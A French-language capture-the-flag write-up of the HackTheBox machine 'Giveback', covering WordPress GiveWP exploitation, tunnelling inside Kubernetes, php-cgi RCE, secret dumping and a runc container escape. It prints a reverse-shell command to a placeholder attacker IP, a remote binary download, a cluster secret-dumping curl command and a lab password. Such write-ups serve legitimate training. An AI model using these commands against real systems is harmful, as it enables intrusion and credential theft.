---
date: 2026-02-20T06:17:43-06:00
# description: ""
image: "/images/HTB-Giveback/Giveback.png"
lastmod: 2026-02-20
showTableOfContents: true
tags: ["HackTheBox", "WordPress", "GiveWP", "CVE-2024-5932", "CVE-2024-8353", "PHP", "PHP CGI", "Kubernetes", "Kubernetes API", "tunneling", "CVE-2024-4577", "runc", "CVE-2024-21626", "container-escape"  ]
categories: ["Writeups"]
title: "HTB: Giveback"
type: "post"
---

* Platforme: HackTheBox
* Lien: [Giveback](https://app.hackthebox.com/machines/Giveback)
* Niveau: Moyen
* OS: Linux
---

Giveback commence par l'identification d'un plugin WordPress vulnérable affecté par `CVE-2024-5932` et `CVE-2024-8353`. L'exploitation de ce dernier permet d'obtenir un accès initial au système cible.

L’énumération post-exploitation révèle que l’hôte compromis s’exécute au sein d’un pod Kubernetes disposant de privilèges limités. L’analyse du système permet de découvrir un service interne accessible uniquement au sein du cluster, auquel on accède par le tunneling.

L’application interne utilise sur `php-cgi`, vulnérable au `CVE-2024-4577`, permettant l’exécution de commandes à distance ainsi qu’un mouvement latéral vers un autre pod. Dans cet environnement, un jeton de compte de service Kubernetes est découvert puis utilisé pour s’authentifier directement auprès de l’API Kubernetes. Cet accès permet d’extraire les secrets du cluster, notamment les identifiants d’un utilisateur privilégié.

Après l’obtention d’un accès SSH, l'élévation de privilèges est réalisée en abusant d’un utilitaire de débogage exécutable en tant que root, menant finalement à la compromission complète du système.

# Balayage

```
nmap -p- --min-rate 1000 -T4 --open -n -Pn -sC -sV -oA nmap/Giveback {IP}
```

**Résultats**
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-17 12:21 CST
Nmap scan report for 10.129.12.207 (10.129.12.207)
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)

80/tcp open  http    nginx 1.28.0
|_http-server-header: nginx/1.28.0
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-generator: WordPress 6.8.1
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.16 seconds
```

Nmap détecte deux ports ouverts:
* 22 (SSH) `OpenSSH 8.9p1` 
* 80 (http) `Nginx 1.28.0`, on observe également que le site web hébergé est basé sur `WordPress 6.8.1`. Un fichier `robots.txt` est présent avec l'entrée interdite `/wp-admin/`.

Afin de faciliter l'énumération, j'ajoute une entrée au fichier `/etc/hosts`.
```
sudo echo "{IP} giveback.htb" | sudo tee -a /etc/hosts
```

# Enumération

En visitant `http://giveback.htb/`, nous trouvons un site web dédié aux dons.

![Giveback website](/images/HTB-Giveback/giveback_website.png)

Passons à l'énumération des répertoires.
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://giveback.htb
```

![Giveback gobuster](/images/HTB-Giveback/giveback_gobuster.png)

À l'aide de `gobuster`, nous trouvons une page de connexion WordPress à l'adresse `http://giveback.htb/wp-login.php`. Nous ne disposons actuellement d'aucune information d'identification à tester, nous passons donc à l'étape suivante.

![Giveback WordPress admin page](/images/HTB-Giveback/giveback_wp_login.png)

En exécutant `whatweb http://giveback.htb`, nous trouvons un plugin et sa version: `Give v3.14.0`.

![Giveback whatweb](/images/HTB-Giveback/GiveWP_version.png)

Nous pouvons interroger l'API REST WordPress pour énumérer les utilisateurs enregistrés:

```
curl -q http://giveback.htb/wp-json/wp/v2/users | jq
```

> Ce point de terminaison est accessible au public par défaut dans WordPress et peut divulguer des noms d'utilisateur valides.

![Giveback WordPress user enumeration](/images/HTB-Giveback/WP_users_API.png)

Nous en trouvons un appelé `babywyrm`.

Sur `http://giveback.htb/donations/the-things-we-need/`, nous pouvons voir que le plugin s'appelle [GiveWP](https://givewp.com/), un plugin de don pour WordPress.

![Giveback donation page](/images/HTB-Giveback/GiveWP_page.png)

# Accès Initial (shell en tant que root sur le WordPress pod)

Cette version est vulnérable à la fois aux [CVE-2024-5932](https://github.com/advisories/GHSA-v25r-h42w-j2vq) et [CVE-2024-8353](https://github.com/advisories/GHSA-vpc6-qr46-3mw7). Nous utiliserons la seconde, dont le PoC est disponible [ici](https://github.com/EQSTLab/CVE-2024-8353).

Configurer un environnement virtuel:

```
python3 -m venv myvenv
source myvenv/bin/activate
pip install -r requirements.txt
```

Exécutez ensuite le script d'exploitation:
```
python CVE-2024-8353.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT_NUMBER 0>&1'"
```

![Giveback CVE-2024-8523](/images/HTB-Giveback/CVE-2024-8523.png)


Sur notre listener, nous obtenons un shell.

![Giveback foothold](/images/HTB-Giveback/giveback_foothold.png)

Puisque nous traitons avec WordPress, nous pouvons consulter le fichier `wp-config.php`. À l'aide de la commande `find`, nous trouvons son emplacement : `/opt/bitnami/wordpress/wp-config.php`.

```
cat /opt/bitnami/wordpress/wp-config.php
```

![WordPress config](/images/HTB-Giveback/wp-config.png)

Il contient les informations de la base de données.

![Giveback database data](/images/HTB-Giveback/db_info.png)

```
DB_NAME = bitnami_wordpress
DB_USER = bn_wordpress
DB_PASSWORD = sW5sp4spa3u7RLyetrekE4oS
DB_HOST = beta-vino-wp-mariadb:3306
```

> Pour une raison qui m'échappe, je n'ai pas pu accéder à la base de données après avoir exécuté `mysql -h beta-vino-wp-mariadb -u bn_wordpress -p` et saisi le mot de passe. Le shell restait figé indéfiniment.

La chaîne ressemblant à un nom d’hôte `84f9998c69-mbb95` correspond à une convention classique de nommage des pods/conteneurs Kubernetes.

En consultant le fichier `/etc/hosts`, nous pouvons confirmer que nous nous trouvons à l’intérieur d’un pod Kubernetes (K8s). Celui-ci contient l’entrée suivante: `beta-vino-wp-wordpress-84f9998c69-mbb95`, qui correspond au schéma de nommage typique des pods (nom de l’application + suffixe aléatoire).

> L’adresse IP du pod WordPress est `10.42.1.249`.

![Giveback hosts](/images/HTB-Giveback/giveback_hosts.png)

En jetant un œil au fichier `/etc/resolv.conf`, nous observons des zones DNS internes à Kubernetes.

* Le système utilise le DNS interne de Kubernetes.
* `cluster.local` correspond au domaine par défaut du cluster Kubernetes.
* `svc.cluster.local` constitue la zone DNS dédiée aux services Kubernetes.

Cela signifie que cela peut être résolu comme suit: `<service>.<namespace>.svc.cluster.local`. Un exemple serait `beta-vino-wp-mariadb.default.svc.cluster.local`.

![Giveback conf](/images/HTB-Giveback/giveback_conf.png)

Nous vérifions les variables d'environnement avec `printenv` et trouvons des éléments intéressants:

> L'exécution de `printenv` produit un résultat volumineux, que j'ai réduit à l'aide de la commande grep.

```
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
LEGACY_INTRANET_SERVICE_PORT= tcp://10.43.2.241:5000
```

![Giveback env](/images/HTB-Giveback/giveback_legacy_srv.png)

## Shell en tant que root sur legacy-intranet-cms pod

Il existe un service Kubernetes interne appelé `legacy-intranet-service` qui s'exécute à l'adresse `http://10.43.2.241:5000`.

Nous utilisons [chisel](https://github.com/jpillora/chisel)  pour inspecter le service sur le port `5000`.

Nous disposons ni de `cURL` ni de `wget` sur la cible, nous utilisons donc `php` pour télécharger le binaire Chisel.

Nous lançons un serveur web sur notre machine d'attaque avec `python3 -m http.server`.

Sur la cible, nous exécutons :

```
php -r "file_put_contents('chisel', file_get_contents('http://KALI_IP:8000/chisel'));"

chmod +x chisel
```

![Giveback file transfer](/images/HTB-Giveback/php_file_transfer.png)

Sur la machine d'attaque:
```
chisel server -p <CHISEL_SERVER_PORT_NUMBER> --reverse
```

![Giveback chisel server](/images/HTB-Giveback/giveback_chisel.png)

Sur la cible, nous exécutons:
```
./chisel client KALI_IP:<CHISEL_SERVER_PORT_NUMBER> R:<PORT_NUMBER>:10.43.2.241:5000
```

![Giveback chisel target](/images/HTB-Giveback/chisel_target.png)

Nous allons à l'adresse `http://127.0.0.1:<PORT_NUMBER>/`, où nous trouvons un site web.

![Giveback internal website](/images/HTB-Giveback/giveback_internal.png)

L’avertissement indique la présence d’un mode legacy. Parmi les points d’accès exposés, l’endpoint `/cgi-bin/php-cgi` attire particulièrement l’attention. Sa présence suggère fortement que l’application exécute l’interpréteur PHP en mode CGI, dans lequel le serveur web invoque le binaire `php-cgi` (Common Gateway Interface) comme un processus autonome pour chaque requête. Contrairement à `PHP-FPM` ou `mod_php`, le mode CGI repose largement sur les variables d’environnement et l’analyse des paramètres de requête afin de transmettre les entrées utilisateur à l’interpréteur.

Cette configuration est dangereuse, car des entrées utilisateur non filtrées peuvent être interprétées comme des arguments en ligne de commande par le binaire PHP, pouvant conduire à des vulnérabilités d’injection d’arguments.

Nous découvrons également une note destinée aux développeurs indiquant comment accéder à `phpinfo.php`, page qui n’est pas accessible via les liens présents sur le site web.

![Giveback phpinfo no access](/images/HTB-Giveback/phpinfo_gb.png)

![Giveback phpinfo source code](/images/HTB-Giveback/page_source_phpinfo.png)

À l'adresse `http://127.0.0.1:<PORT_NUMBER>/phpinfo.php?debug`, nous constatons que PHP fonctionne sous la version `8.3.3`.

![Giveback phpinfo](/images/HTB-Giveback/gb_phpinfo.png)

En recherchant les vulnérabilités de `php-cgi` nous trouvons le [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/cve-2024-4577) avec un PoC disponible [ici](https://github.com/toshithh/Ice-Tools/blob/main/CVE-2024-4577.py).

En utilisant le poc, nous obtenons un shell sur le pod `legacy-intranet-cms`.

```
python3 CVE-2024-4577.py --target http://IP:PORT/cgi-bin/php-cgi
```

![Giveback foothold intranet](/images/HTB-Giveback/foothold_2.png)

Dans les environnements Kubernetes, `/var/run/secrets/kubernetes.io/serviceaccount/` est l'emplacement où les informations d'identification sont stockées par défaut, alors consultons-le.

Dans `var/run/secrets/kubernetes.io/serviceaccount/`, nous trouvons un fichier nommé `token`.

![Giveback k8s token](/images/HTB-Giveback/giveback_k8s_token.png)

L'exécution de `cat /var/run/secrets/kubernetes.io/serviceaccount/token` affiche la valeur dudit jeton. Dans Kubernetes, un pod utilise le jeton pour s'authentifier auprès du serveur API Kubernetes. Il est utilisé comme suit:

```
Authorization: Bearer <token>
```

Selon la configuration des contrôles d'accès, le jeton peut permettre :
* de répertorier les pods
* de lire les secrets
* de créer des pods
* d'exécuter des commandes dans d'autres pods, etc.

Le `namespace` est `default`.

> Un namespace Kubernetes est une frontière d’isolation logique permettant de regrouper et de délimiter les ressources au sein d’un cluster, et notre pod appartient au namespace `default`.

![Giveback namespace](/images/HTB-Giveback/GB_default_namespace.png)

We query all the secrets in the `default` namespace.

```
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```
> Le résultat est volumineux, mais l'information la plus importante se trouve à la fin.

Nous trouvons le mot de passe encodé en base64 de l'utilisateur `babywyrm`.

![Giveback secrets dump](/images/HTB-Giveback/k8s_secrets_dump.png)

Après l'avoir décodé, nous nous connectons via SSH.

```
echo "base64_value" | base64 -d

ssh babywyrm@giveback.htb
```

# Elévation de Privilèges

![Giveback user flag](/images/HTB-Giveback/GB_user.png)

En exécutant `sudo -l`, nous constatons que `babywyrm` peut exécuter `/opt/debug` en tant que N'IMPORTE QUEL utilisateur (y compris root). Nous essayons et sommes invités à saisir un mot de passe.

![Giveback sudo privileges](/images/HTB-Giveback/giveback_sudo_priv.png)

Le mot de passe demandé est le même que celui que nous utilisons pour nous connecter via SSH.

Ensuite, on nous demande un mot de passe administratif, qui est le mot de passe de la base de données que nous avons trouvé précédemment lors de notre énumération.

```
sW5sp4spa3u7RLyetrekE4oS
```

En utilisant l'option `help`, nous obtenons plus d'informations sur le script. `/opt/debug` est un wrapper autour de `runc`, et `runc` est le runtime de conteneur de bas niveau utilisé par Docker et Kubernetes.

![Giveback debug script](/images/HTB-Giveback/giveback_debug.png)

Ensuite, nous exécutons `sudo /opt/debug version` et découvrons que runc utilise la `version 1.1.11`. Une recherche Google avec `runc version 1.1.11 vulnerability` mène au [CVE-2024-21626](https://nvd.nist.gov/vuln/detail/cve-2024-21626) et sur [this page](https://www.vicarius.io/vsociety/posts/leaky-vessels-part-1-cve-2024-21626) nous obtenons une explication détaillée de l'exploitation.

> MODIFICATION 23/02/2026: **Je n’ai pas réussi à résoudre la partie root de cette machine par moi-même, j’ai donc attendu les walkthroughs de [ippsec](https://www.youtube.com/watch?v=wNKWDKleH04) and [0xdf](https://0xdf.gitlab.io/2026/02/21/htb-giveback.html). Un grand merci à eux pour tout le travail qu’ils fournissent pour la communauté.**

1. Création d'un système de fichiers root minimal.

`runc` ne crée pas de systèmes de fichiers à partir de rien; il a besoin d’un répertoire `rootfs` contenant:
* `/bin/sh`
* les bibliothèques partagées nécessaires
* le chargeur dynamique `ld-linux`

En pratique, nous avons recréé ce qu’une image Docker fournit normalement.

```
mkdir -p kscorpio/rootfs
cd kscorpio/
cp -aL /bin rootfs/bin
mkdir rootfs/lib64
cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/
mkdir rootfs/lib
cp -a /lib/x86_64-linux-gnu rootfs/lib
```

![Giveback privesc](/images/HTB-Giveback/GB_privesc.png)

2. Déclenchement du `CVE-2024-21626`

La commande `run spec` génère un fichier `config.json` valide. L'étape cruciale consiste à ajouter `"cwd": "/proc/self/fd/7"` au fichier. `CVE-2024-21626` est une vulnérabilité d'évasion de conteneur dans `runc` qui se produit lorsque runc ne parvient pas à valider correctement les répertoires de travail qui font référence aux descripteurs de fichiers `/proc/self/fd/*`.

```
runc spec
ls
```

![Giveback privesc 2](/images/HTB-Giveback/GB_privesc1.png)

```
vim config.json
cat config.json | grep cwd
```

`/proc/self/fd/7` n'est pas un répertoire normal, c'est une référence à un descripteur de fichier ouvert hérité du processus runc. En modifiant le paramètre `cwd` en `/proc/self/fd/7`, nous avons exploité la gestion incorrecte par runc des descripteurs de fichiers hérités lors de l'initialisation du conteneur.

Essentiellement, le processus du conteneur démarre dans un répertoire situé en dehors du système de fichiers root du conteneur (`rootfs`).

![Giveback config modification](/images/HTB-Giveback/GB_custon_config.png)

![Giveback privesc 3](/images/HTB-Giveback/GB_privesc2.png)

3. Accès au système de fichiers hôte

`runc` démarre en tant que root, utilise la configuration malveillante, lance le conteneur avec `cwd=/proc/self/fd/7`, ce qui rompt l'isolation du montage.

Par conséquent, nous ne sommes plus confinés au rootfs du conteneur, nous exécutons dans un contexte de répertoire hôte. C'est pourquoi `ls ../../../root` nous montre `root.txt`, nous accédons au répertoire root de l'hôte depuis l'intérieur du conteneur.

```
sudo /opt/debug --log /tmp/log.json run root
ls ../../../root
cat ../../../root/root.txt
```

![Giveback root flag](/images/HTB-Giveback/GB_root_flag.png)

